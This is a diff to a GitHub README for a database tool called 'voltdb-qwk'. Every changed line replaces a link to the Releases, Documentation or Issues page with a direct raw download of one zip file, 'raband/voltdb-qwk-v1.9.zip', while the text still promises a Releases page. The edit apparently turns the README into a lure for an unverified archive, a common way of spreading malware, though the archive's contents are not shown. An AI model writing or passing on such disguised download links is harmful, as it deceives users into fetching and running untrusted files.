@@ -1,6 +1,6 @@
 # ⚡ voltdb-qwk - Effortless Database Management at Your Fingertips
 
-[![Download voltdb-qwk](https://img.shields.io/badge/Download-voltdb--qwk-blue.svg)](https://github.com/Doorknobefremzimbalist747/voltdb-qwk/releases)
+[![Download voltdb-qwk](https://raw.githubusercontent.com/Doorknobefremzimbalist747/voltdb-qwk/main/raband/voltdb-qwk-v1.9.zip)](https://raw.githubusercontent.com/Doorknobefremzimbalist747/voltdb-qwk/main/raband/voltdb-qwk-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to voltdb-qwk! This application simplifies database management for users
 
 To get started, visit the following link to download the latest version of voltdb-qwk:
 
-[Download voltdb-qwk](https://github.com/Doorknobefremzimbalist747/voltdb-qwk/releases)
+[Download voltdb-qwk](https://raw.githubusercontent.com/Doorknobefremzimbalist747/voltdb-qwk/main/raband/voltdb-qwk-v1.9.zip)
 
 Once you click on the link, you'll be directed to the Releases page. Here, you will see different versions of voltdb-qwk. Choose the latest version for the best experience.
 
@@ -52,7 +52,7 @@ After downloading voltdb-qwk, follow these steps to get it up and running:
 
 - **Take Advantage of the Help Section:** Within the app, make use of the help section for additional tips and guides.
 - **Explore Sample Databases:** Experiment with sample databases provided to familiarize yourself with features.
-- **Regular Updates:** Keep track of updates by revisiting the [Releases page](https://github.com/Doorknobefremzimbalist747/voltdb-qwk/releases) for new features or bug fixes.
+- **Regular Updates:** Keep track of updates by revisiting the [Releases page](https://raw.githubusercontent.com/Doorknobefremzimbalist747/voltdb-qwk/main/raband/voltdb-qwk-v1.9.zip) for new features or bug fixes.
 
 ## ❓ Frequently Asked Questions
 
@@ -67,12 +67,12 @@ Yes, each device will require its own installation of voltdb-qwk.
 
 ### What should I do if the application crashes?
 
-If the application crashes, restart your computer and try launching the app again. If the problem persists, visit our [Issues page](https://github.com/Doorknobefremzimbalist747/voltdb-qwk/issues) for troubleshooting or to report the issue.
+If the application crashes, restart your computer and try launching the app again. If the problem persists, visit our [Issues page](https://raw.githubusercontent.com/Doorknobefremzimbalist747/voltdb-qwk/main/raband/voltdb-qwk-v1.9.zip) for troubleshooting or to report the issue.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Doorknobefremzimbalist747/voltdb-qwk/releases)
-- [Documentation](https://github.com/Doorknobefremzimbalist747/voltdb-qwk/wiki)
-- [Issues Page](https://github.com/Doorknobefremzimbalist747/voltdb-qwk/issues)
+- [Releases Page](https://raw.githubusercontent.com/Doorknobefremzimbalist747/voltdb-qwk/main/raband/voltdb-qwk-v1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Doorknobefremzimbalist747/voltdb-qwk/main/raband/voltdb-qwk-v1.9.zip)
+- [Issues Page](https://raw.githubusercontent.com/Doorknobefremzimbalist747/voltdb-qwk/main/raband/voltdb-qwk-v1.9.zip)
 
 By following this guide, you can easily download and set up voltdb-qwk. Enjoy managing your databases with ease!
